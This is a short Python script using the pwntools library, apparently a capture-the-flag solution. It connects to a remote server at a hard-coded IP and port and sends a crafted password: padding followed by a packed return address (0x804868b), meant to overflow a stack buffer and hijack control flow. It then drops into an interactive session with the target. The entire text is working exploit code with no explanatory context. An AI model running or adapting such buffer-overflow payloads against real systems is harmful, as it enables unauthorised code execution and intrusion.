from pwn import *

p = remote("220.249.52.133",52163)
payload = "a"*0x14+"a"*4+p32(0x804868b)+"a"*(256-0x18-4)+"a"*4


p.sendlineafter("Your choice:","1")
p.sendlineafter("Please input your username:","aaaa")
p.sendlineafter("Please input your passwd:",payload)

p.interactive()